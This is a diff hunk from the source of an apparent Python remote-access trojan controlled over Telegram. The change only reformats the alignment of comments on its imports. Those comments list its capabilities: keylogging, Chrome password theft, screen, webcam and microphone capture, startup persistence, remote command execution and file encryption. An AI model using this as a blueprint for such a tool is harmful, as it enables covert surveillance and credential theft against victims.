@@ -4,36 +4,36 @@ import os, os.path, platform, ctypes
 os.environ["PBR_VERSION"]='5.0.0'
 import logging
 from consoleTools import consoleDisplay as cd
-from PIL import ImageGrab 								# /capture_pc
-from shutil import copyfile, copyfileobj, rmtree, move 	# /ls, /pwd, /cd, /copy, /mv
-from sys import argv, path, stdout 						# console output
-from json import loads 									# reading json from ipinfo.io
-from winshell import startup 							# persistence
-from tendo import singleton								# this makes the application exit if there's another instance already running
-from win32com.client import Dispatch					# WScript.Shell
+from PIL import ImageGrab                                                 # /capture_pc
+from shutil import copyfile, copyfileobj, rmtree, move                    # /ls, /pwd, /cd, /copy, /mv
+from sys import argv, path, stdout                                        # console output
+from json import loads                                                    # reading json from ipinfo.io
+from winshell import startup                                              # persistence
+from tendo import singleton                                               # this makes the application exit if there's another instance already running
+from win32com.client import Dispatch                                      # WScript.Shell
 from time import strftime, sleep
-from subprocess import Popen, PIPE						# /cmd_exec					
-import psutil											# updating	
+from subprocess import Popen, PIPE                                        # /cmd_exec
+import psutil                                                             # updating
 import shutil
-import win32clipboard                                   # register clipboard    
-import sqlite3											# get chrome passwords
-import win32crypt										# get chrome passwords
-import base64											# /encrypt_all
-import datetime											# /schedule
+import win32clipboard                                                     # register clipboard
+import sqlite3                                                            # get chrome passwords
+import win32crypt                                                         # get chrome passwords
+import base64                                                             # /encrypt_all
+import datetime                                                           # /schedule
 import time
-import threading 										# /proxy, /schedule
+import threading                                                          # /proxy, /schedule
 import proxy
-import pyaudio, wave 									# /hear
-import telepot, requests 								# telepot => telegram, requests => file download
+import pyaudio, wave                                                      # /hear
+import telepot, requests                                                  # telepot => telegram, requests => file download
 from telepot.namedtuple import InlineKeyboardMarkup, InlineKeyboardButton
-import pyHook, pythoncom 								# keylogger
-import socket									# internal IP
-import getpass											# get username
+import pyHook, pythoncom                                                  # keylogger
+import socket                                                             # internal IP
+import getpass                                                            # get username
 import collections
-import urllib# wallpaper
-import cv2#webcam
+import urllib                                                             # wallpaper
+import cv2                                                                # webcam
 from datetime import datetime
-from ctypes import * #fixing pyinstaller - we need to import all the ctypes to get api-ms-win-crt-*, you will also need https://www.microsoft.com/en-US/download/details.aspx?id=48145
+from ctypes import *                                                      # fixing pyinstaller - we need to import all the ctypes to get api-ms-win-crt-*, you will also need https://www.microsoft.com/en-US/download/details.aspx?id=48145
 
 cd.log('i','Starting')
 me = singleton.SingleInstance()
